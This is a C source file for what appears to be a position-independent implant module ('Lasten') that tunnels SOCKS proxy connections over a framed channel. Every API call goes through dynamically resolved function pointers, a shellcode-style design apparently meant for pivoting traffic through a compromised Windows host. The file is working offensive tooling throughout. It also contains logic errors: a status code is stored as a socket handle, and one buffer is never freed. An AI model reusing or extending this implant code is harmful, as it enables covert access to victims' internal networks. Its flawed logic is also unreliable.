#include "Core.h"

DWORD inLoop(LastenPIC * pLastenPIC) {

	DWORD dwSuccess = FAIL, dwLenFrame = 0;
	LastenFrame* pLastenFrameIn = NULL, * pLastenFrameOut = NULL;

	pLastenFrameIn = pLastenPIC->fPointers._VirtualAlloc(0, sizeof(LastenFrame), MEM_COMMIT, PAGE_READWRITE);
	if (pLastenFrameIn == NULL)
		goto exit;

	pLastenFrameOut = pLastenPIC->fPointers._VirtualAlloc(0, sizeof(LastenFrame), MEM_COMMIT, PAGE_READWRITE);
	if (pLastenFrameOut == NULL)
		goto exit;

	while ( 1 ) {

		dwSuccess = readLastenFrame(pLastenPIC, pLastenFrameIn, &dwLenFrame);
		if (dwSuccess == FAIL)
			goto exit;

		handleLastenFrame(pLastenPIC, pLastenFrameIn, pLastenFrameOut);
	
	}

	dwSuccess = SUCCESS;

exit:

	pLastenPIC->bContinue = FALSE;

	if (pLastenFrameIn)
		pLastenPIC->fPointers._VirtualFree(pLastenFrameIn, 0, MEM_RELEASE);

	return dwSuccess;

}

void handleLastenFrame(LastenPIC* pLastenPIC, LastenFrame* pFrameIn, LastenFrame *pFrameOut) {

	SOCKET socket = 0;

	socket = getSocksConn(pLastenPIC, pFrameIn->session, &socket);
	if (socket == 0) 
		handleNewConn(pLastenPIC, pFrameIn, pFrameOut);
	else if (pFrameIn->command == CMD_SEND) {
		handleSend(pLastenPIC, pFrameIn, pFrameOut);
	} else if (pFrameIn->command == CMD_STOP) {
		handleStopConn(pLastenPIC, pFrameIn->session);
	}

}

void handleSend(LastenPIC* pLastenPIC, LastenFrame* pFrameIn, LastenFrame* pFrameOut) {

	SOCKET socket = 0;
	DWORD dwSuccess = FAIL;
	int rv = 0;

	dwSuccess = getSocksConn(pLastenPIC, pFrameIn->session, &socket);
	if (dwSuccess == 0)
		goto exit;

	rv = pLastenPIC->fPointers._send(socket, (const char*)pFrameIn->message, (int)pFrameIn->message_len, 0);
	if (rv == SOCKET_ERROR)
		goto exit;

	dwSuccess = SUCCESS;

exit:

	if (dwSuccess == FAIL) {

		handleStopConn(pLastenPIC, pFrameIn->session);

		pFrameOut->session = pFrameIn->session;
		pFrameOut->command = CMD_STOP;
		pFrameOut->message_len = 1;

		sendLastenFrame(pLastenPIC, pFrameOut);

	}

	return;

}


#pragma GCC push_options
#pragma GCC optimize ("O0")
void handleStopConn(LastenPIC* pLastenPIC, uint64_t id) {

	SOCKET socket = 0;
	DWORD dwSuccess = 0x00;

	dwSuccess = getSocksConn(pLastenPIC, id, &socket);
	if (dwSuccess == 0)
		goto exit;

	for (int i = 0; i < MAX_CONNECTIONS; i++) {
		if (pLastenPIC->ids[i] == id) {

			FD_CLR(socket, &pLastenPIC->master_set);

			pLastenPIC->ids[i] = 0;
			pLastenPIC->sockets[i] = 0;
			pLastenPIC->numConnections--;

			break;

		}
	}

	pLastenPIC->fPointers._Closesocket(socket);


exit:

	return;

}
#pragma GCC pop_options

void handleNewConn(LastenPIC* pLastenPIC, LastenFrame *pFrameIn, LastenFrame* pFrameOut) {

	DWORD dwSuccess = FAIL;
	SOCKET socket = 0;
	SocksConnectReplyFrame socksConnectReplyFrame = { 0x00 };

	if (pLastenPIC->numConnections == MAX_CONNECTIONS) 
		goto exit;
	
	dwSuccess = newSocksConn(pLastenPIC, (SocksConnectFrame*)pFrameIn->message, &socket, &socksConnectReplyFrame);
	if (dwSuccess == FAIL)
		goto exit;

	for (int i = 0; i < MAX_CONNECTIONS; i++) {
		if (pLastenPIC->ids[i] == 0) {

			pLastenPIC->ids[i] = pFrameIn->session;
			pLastenPIC->sockets[i] = socket;
			FD_SET(socket, &pLastenPIC->master_set);
			pLastenPIC->numConnections++;

			break;
		}
	}

exit:

	pFrameOut->session = pFrameIn->session;
	pFrameOut->command = (dwSuccess == FAIL) ? CMD_STOP : CMD_SEND;
	pLastenPIC->fPointers._CopyMemory(pFrameOut->message, &socksConnectReplyFrame, sizeof(SocksConnectFrame));
	pFrameOut->message_len = sizeof(SocksConnectReplyFrame);

	sendLastenFrame(pLastenPIC, pFrameOut);

	return;

}

DWORD getSocksConn(LastenPIC* pLastenPIC, uint64_t id, SOCKET* pSocksConn) {

	DWORD dwSuccess = FAIL;

	for (int i = 0; i < MAX_CONNECTIONS; i++) {
		if (pLastenPIC->ids[i] == id) {
			*pSocksConn = pLastenPIC->sockets[i];
			dwSuccess = SUCCESS;
			break;
		}
	}

	return dwSuccess;

}

void outLoop(LastenPIC* pLastenPIC) {

	int ret = 0, i = 0;
	SOCKET s = 0;

	LastenFrame* pFrameOut = NULL;
	FD_SET working_set = { 0 };
	struct timeval tv;
	tv.tv_sec = 1;

	pFrameOut = pLastenPIC->fPointers._VirtualAlloc(0, sizeof(LastenFrame), MEM_COMMIT, PAGE_READWRITE);
	if (pFrameOut == NULL)
		goto exit;

	while ( pLastenPIC->bContinue ) {

		for (uint32_t i = 0; i < sizeof(struct timeval); i++) {
			*((uint8_t*)(&tv) + i) = 0x00;
		}
	
		tv.tv_sec = 1;

		pLastenPIC->fPointers._CopyMemory(&working_set, &pLastenPIC->master_set, sizeof(pLastenPIC->master_set));
		
		ret = pLastenPIC->fPointers._select(0, &working_set, NULL, NULL, &tv);
		if (ret <= 0)
			continue;

		for (i = 0; i < MAX_CONNECTIONS; i++) {

			if (pLastenPIC->ids[i] == 0 || pLastenPIC->sockets[i] == 0)
				continue;

			s = pLastenPIC->sockets[i];

			if (pLastenPIC->fPointers._wsafdisset(s, &working_set)) {

				for (uint32_t i = 0; i < sizeof(LastenFrame); i++){
				*((uint8_t*)(pFrameOut) + i) = 0x00;
				}

				pFrameOut->session = pLastenPIC->ids[i];

				ret = pLastenPIC->fPointers._recv(s, (char*)pFrameOut->message, MAX_MESSAGE - 200, 0);
				if (ret <= 0) {
					
					handleStopConn(pLastenPIC, pLastenPIC->ids[i]);

					pFrameOut->command = CMD_STOP;
					pFrameOut->message_len = 1;

					sendLastenFrame(pLastenPIC, pFrameOut);

				} else if (ret > 0) {

					pFrameOut->message_len = ret;
					pFrameOut->command = CMD_SEND;

					sendLastenFrame(pLastenPIC, pFrameOut);
					
				}
			}
		}
	}


exit:

	if (pFrameOut)
		pLastenPIC->fPointers._VirtualFree(pFrameOut, 0, MEM_RELEASE);

	return;

}
